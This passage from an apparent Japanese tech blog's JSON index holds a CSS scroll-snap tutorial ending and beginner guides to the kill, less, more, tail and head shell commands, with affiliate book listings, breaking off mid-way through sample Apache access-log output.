同じことが垂直スクロールでも機能します。以下の例を参照してください。\n.section { overflow-y: auto; scroll-snap-type: y mandatory; scroll-padding: 50px 0 0 0; } スクロールスナップのmargin scroll-marginショートハンドプロパティは、スクロールコンテナーの子アイテム間の間隔を設定します。要素にマージンが追加されると、マージンに応じてスクロールがスナップします。下図を参照してください。\n.item-2はscroll-margin-left: 20pxとなっています。その結果、スクロールコンテナーはそのアイテムの手前20pxにスナップします。ユーザーが再び右にスクロールしたとき、.item-3はスクロールコンテナーの開始位置にスナップすることに注意してください。つまり、マージンを持つ要素のみが影響を受けることになります。\nCSSスクロールスナップの使用例 画像リスト CSSスクロールスナップの優れた使用例として、画像のリストが挙げられます。スクロールスナップを使用することで、より良いスクロール体験を提供します。\n.images-list { display: flex; overflow-x: auto; scroll-snap-type: x; gap: 1rem; -webkit-overflow-scrolling: touch; /* Important for iOS devices */ } .images-list img { scroll-snap-align: start; } scroll-snap-typeの値としてxを使用したことに注意してください。スナップの厳密さは、デフォルトではproximityになります。\n友達リスト スクロールスナップのもう1つの優れた使用例として、友達のリストがあります。以下の例は、Facebookから引用したものです（実例）。\n.list { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; gap: 1rem; scroll-padding: 48px; padding-bottom: 32px; -webkit-overflow-scrolling: touch; } .list-item { scroll-snap-align: start; } スクロールするコンテナーにはpadding-bottomがあることに注意してください。32pxです。この目的は、ボックスシャドウが期待どおりに表示されるように余分なスペースを提供することです。\nアバターリスト 今回の使用例では、子アイテムのscroll-snap-alignの値としてcenterを使用しています。\n.list { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch; } .list-item { scroll-snap-align: center; } これはアバターのリストで、アバターがスクロールするコンテナーの中央にあることが重要な場合に便利です。\n全画面を覆うような要素 スクロールスナップの使用は、縦スクロールの場合にも有効です。この例として、フルハイトのセクションがあります。\n\u0026lt;main\u0026gt; \u0026lt;section class=\u0026#34;section section-1\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-2\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-3\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-4\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-5\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;/main\u0026gt; main { height: 100vh; overflow-y: auto; scroll-snap-type: y mandatory; -webkit-overflow-scrolling: touch; } .section { height: 100vh; scroll-snap-align: start; } ブロックおよびインラインの値 特筆すべきは、scroll-snap-typeにinlineとblockという論理値を使用できることです。以下の例を参照してください。\nmain { scroll-snap-type: inline mandatory; } この例では、英語のような横書きモードでは、inlineが横方向の寸法を表します。日本語のような言語では、inlineは縦方向の寸法を表すことになります。\nCSSの論理プロパティについてもっと知りたい方は、Adrian Roselliの記事 をご覧ください。\nアクセシビリティ CSSスクロールスナップを使用する際は、アクセシビリティを確保すること。ここでは、ユーザーがコンテンツを自由にスクロールして読むことを妨げる、スクロールスナップの悪い使い方を紹介します。\n.wrapper { scroll-snap-type: y mandatory; } h2 { scroll-snap-align: start; } デモのような実装は絶対にしないでください。\nまとめ 以上がscroll-snap機能についてになります。今までスナップするスクロールを実装する場合はjsを使用していましたが、cssのみで実装可能となると簡単になりますね。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-14T12:33:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro_hu1a4f8ee8698ef571fbfcd575aad93d81_24156_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/","title":"CSSでアプリのようにピタッとスナップするスクロールを作成"},{"content":"killコマンド killコマンドでプロセスIDを指定してプロセスを終了させる killallコマンドで名前を指定してプロセスを終了させる killコマンド概要 プロセスを強制終了させます。\nkillは実行中のプロセスを終了させる場合に使うコマンドです。\nkillコマンドでプロセスを終了させるには、\n$ kill ＜プロセスID＞ で指定します。\n例えば、100番のプロセスならば\n$ kill 100 と指定します。\nプロセスIDは「ps」コマンドで調べることができます。\nkillコマンドの書式 kill [オプション] プロセスID\nkillコマンドの主なオプション オプション 意味 -s シグナル プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能 -l シグナル名のリストを表示する killコマンド詳細説明 プロセスＩＤでプロセスを終了させる 「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。\n$ kill ＜プロセスＩＤ＞ killallコマンドで名前を指定してプロセスを終了させる 「killall 名前」で、“名前”に指定したプロセスを終了させることができます。\n$ killall ＜プロセス名＞ さまざまなプロセスの調べ方と終了方法 ps aux を使う方法\nbash-5.1$ ps axu | grep hugo | grep -v grep suzukiiichiro 17498 0.0 3.4 5607088 567104 s003 S+ 水11AM 2:58.60 hugo -D server suzukiiichiro 20710 0.0 1.7 5328588 286744 s005 S+ 11:38AM 0:13.50 hugo server bash-5.1$ 最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。\nさらにawkコマンドでプロセスＩＤを抽出します。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; 17498 20710 bash-5.1$ pgrep を使う方法\npgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。\nbash-5.1$ pgrep hugo 17498 20710 bash-5.1$ プロセスＩＤが解ったところでプロセスを終了します。\n表記 数値 意味 KILL 9 プロセスの強制終了命令 $ kill -9 17498 $ kill -9 20710 面倒ですね。プロセスがたくさんある場合はとても煩雑です。\nxargsコマンドを使うと一片にプロセスを終了させることができます。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; | xargs kill -9 終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。\n$ killall hugo 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-14T11:39:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/","title":"（７）【kill】シェルスクリプトコマンド活用紹介"},{"content":"lessコマンド テキストを1画面ずつ表示する キー操作のヘルプを表示する 長い行を折り返さずに表示する ファイルの末尾まで表示したらすぐに終了する 概要 「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。\n$ cat ＜ファイル名＞ | less 「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。\n$ dmesg | less ヒント ［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。 同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。\nlessコマンドの書式 less [オプション] ファイル名\nコマンド | less [オプション]\nlessコマンドの主なオプション 短いオプション 長いオプション 意味 +行数,-行数 指定した行から表示する +/文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -p文字列 \u0026ndash;pattern=文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -oファイル \u0026ndash;log-file=ファイル パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される -Oファイル \u0026ndash;LOG-FILE=ファイル 「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする -kファイル名 \u0026ndash;lesskey-file=ファイル名 lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する -L \u0026ndash;no-lessopen 環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する lessコマンド詳細説明 テキストを1画面ずつ表示する $ less ＜ファイル名＞ で、指定したファイルを1画面ずつ表示します。\n次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。\n上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。\n［q］キーを押すと終了します。\n以下のような使い方もできます。\n$ cat \u0026lt;filename\u0026gt; | less キー操作のヘルプを表示する lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。\nヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。\n［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります\n長い行を折り返さずに表示する lessコマンドでは、画面の横幅より長い行は折り返して表示されます。\n折り返さずに表示したい場合は、「-S」オプションを使用します。\n左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。\n横スクロールの幅は「-#」オプションで指定できます。　$ cat filename | less -S ヒント ［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-13T16:35:49+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/","title":"（6）【less】シェルスクリプトコマンド活用紹介"},{"content":"moreコマンド 長いメッセージやテキストファイルを1画面ずつ表示する テキストを1画面ずつ止めながら表示する 実行結果を止めながら表示したいときにはパイプを使う 確認したい箇所がある場合は「+/オプション」でスキップ 行番号付きで表示したいときはcatコマンドと組み合わせる moreコマンドで使える主なサブコマンド moreコマンド概要 moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。\n$ more \u0026lt;ファイル名\u0026gt; で実行する他、\n$ cat \u0026lt;ファイル名\u0026gt; | more のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。\nまた、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。\nmoreコマンドの書式 more [オプション] filename\ncat filename | more [オプション]\nmoreコマンドの主なオプション オプション 意味 +数値 数値で指定した行から表示する +/文字列 指定した文字列を検索して、見つけた行の2行上から表示する -s 連続した空行を1行にする -l 改ページを無視する -u 下線の処理を行わない -数値 画面の行数を指定する -f 画面での行数ではなく、データの行数を表示する -d 無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する moreコマンド詳細説明 「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。\nmoreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。\nファイルをページャとして読みたい場合\n$ cat \u0026lt;filename\u0026gt; | more dmsgなどのシステムファイルをページャとして読みたい\n$ dmsg | more ヒント 検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。 ヒント ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-13T16:35:41+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/","title":"（5）【more】シェルスクリプトコマンド活用紹介"},{"content":"tailコマンド tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する ファイルの特定の範囲の行を取り出す（headとtail） 概要 headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。\nログファイルは、基本ファイルの末尾に新たな記録が追加されます。\n「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。\n「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。\n$ cat ＜ファイル名＞ | tail tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。\n$ cat ＜ファイル名＞ | tail -n10 また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。\nログ監視などに多用されるこの具体例も以下に示します。\n$ sudo tail -f /var/log/httpd/access_log tailコマンドの書式 tail [オプション] ファイル名\ntailコマンドの主なオプション 短いオプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 末尾の指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う -f \u0026ndash;follow ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了） tailコマンド詳細説明 tailコマンドでファイルの末尾部分だけを表示する ファイルの末尾を表示します。tail -n で表示行数を変更できます。\ntail -n10 と デフォルトの tail は同じ出力となります。\n$ cat filename | tail -n10 ログファイルを監視する tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。\n$ sudo tail -f /var/log/httpd/error_log ヒント tail -f コマンドはとてもよく使います。 tail -f を実行するtailf コマンドもあります。(Oによりますが) ファイルの特定の範囲の行を取り出す（headとtail） ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？\ncat filename | tail -n200 これだとファイル末尾から200行を出力するにすぎない。\ntail コマンドのみに頼ろうとすると難しいようだ。\n実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。\n$ cat filename | tail -n200 | head -n 100 コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。\n$ cat filename | head -n10100 | tail -n100 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-11T14:31:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/","title":"（４）【tail】シェルスクリプトコマンド活用紹介"},{"content":"headコマンド headコマンドでファイルの先頭部分だけを表示する パイプを使って実行結果の最初の部分だけを確認する tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する 概要 headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。\n表示する行数は、オプションで変更することができます。\n$ cat ＜ファイル名＞ | head -n10 headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。\nheadコマンドの書式 head [オプション] ファイル名\nheadコマンドの主なオプション オプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 先頭から指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う headコマンド詳細説明 headコマンドはファイルの先頭から１０行を表示するコマンドです。\n$ cat filename | head よく使われるオプションは、出力する行数を指定するオプション「n」です。\n$ cat filename | head -n20 データをソートしてベスト１０を出力するという場合によく使います。\n$ sudo cat /var/log/httpd/access_log | grep -iv \u0026#34;ELB-Health-Checker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $1; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | sort | uniq -c | sort -nr | head sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。\nでは、順番に説明していきます。\nまずは純粋にアクセスログを出力します。\n長いのでheadコマンドを使いましょう。\nsuzuki$ sudo cat /var/log/httpd/access_log | head 172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - 